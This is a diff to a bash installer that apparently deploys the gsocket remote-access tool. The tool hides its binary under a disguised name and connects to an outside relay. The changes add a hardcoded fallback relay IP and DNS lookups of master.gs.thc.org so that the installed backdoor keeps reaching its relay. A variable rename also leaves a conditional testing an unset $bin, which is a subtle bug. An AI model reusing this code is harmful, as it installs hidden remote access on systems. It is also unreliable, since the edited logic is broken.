@@ -93,7 +93,7 @@
 # GS_PORT=
 #       - Port for the GSRN-Server. Default is 443.
 # GS_DOMAIN=
-#       - use [a-z].gz.<GS_DOMAIN> to resolve relay addresses.
+#       - use [a-z].gs.<GS_DOMAIN> to resolve relay addresses.
 # GS_WORKDIR=
 #       - Set the HOME directory (e.g. try GS_WORKDIR=/dev/shm).
 
@@ -105,6 +105,7 @@
 # Global Defines
 ###----BEGIN changed by CICD script-----
 CICD_GS_BRANCH=
+GS_HOST_MASTER_IP=87.106.101.131
 ###-----END-----
 [[ $CICD_GS_BRANCH == "master" ]] && unset CICD_GS_BRANCH
 [[ -z $GS_BRANCH ]] && GS_BRANCH="${CICD_GS_BRANCH}"
@@ -788,7 +789,7 @@ init_vars()
 	local arch
 	local osname
 	local service
-	local bin
+	local str
 	arch=$(uname -m)
 	local phome
 
@@ -971,12 +972,12 @@ init_vars()
 	# Defaults
 	# Set GS_BIN if GS_NAME is forced by user without forcing GS_BIN.
 	# [ -n "$GS_NAME" ] && [ -z "$GS_BIN" ] && GS_BIN="${GS_NAME}" # DISABLED because we like to disassociate process with file.
-	bin="$(basename "$GS_BIN")"
+	str="$(basename "$GS_BIN")"
 	if [[ -n "$bin" ]]; then
-		BIN_HIDDEN_NAME="${bin}"
-		BIN_HIDDEN_NAME_RM+=("${bin}")
+		BIN_HIDDEN_NAME="${str}"
+		BIN_HIDDEN_NAME_RM+=("${str}")
 		service="$GS_SERVICE"
-		[[ -z "$service" ]] && service="$bin"
+		[[ -z "$service" ]] && service="$str"
 		# Only check for _this_ binary to allow double installs
 		bin_hidden_name_arr=("${BIN_HIDDEN_NAME}")
 	else
@@ -1075,6 +1076,24 @@ init_vars()
 	[[ $SHELL == *"/dev/null"* ]] && unset SHELL
 	# Test that shell is a good shell.
 	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL
+
+	# Check that the resolver is working at the time of installation:
+	[ -z "$GS_HOST" ] && {
+		unset str
+		if command -v dig >/dev/null; then
+			str="$(dig +short "master.${GS_DOMAIN:-gs.thc.org}")"
+		elif command -v getent >/dev/null; then
+			# getent ahostsv4 is not available on all systems.
+			str="$(getent ahostsv4 "master.${GS_DOMAIN:-gs.thc.org}" 2>/dev/null)"
+			str="${str// */}"
+		else
+			str="cant-test-resolver" # fallthrough dummy
+		fi
+		# If resolver is not working then use GS_HOST_MASTER_IP
+		[ -z "$str" ] && GS_HOST="${GS_HOST_MASTER_IP}"
+		# Musl's static resolver _will fail_ on Android. Use static IP instead:
+		[ -z "$GS_HOST" ] && command -v getprop >/dev/null && getprop &>/dev/null && GS_HOST="${GS_HOST_MASTER_IP}"
+	}
 
 	DEBUGF "DL=${DL[*]}"
 	DEBUGF "URL=${URL_BIN}/${SRC_PKG}"
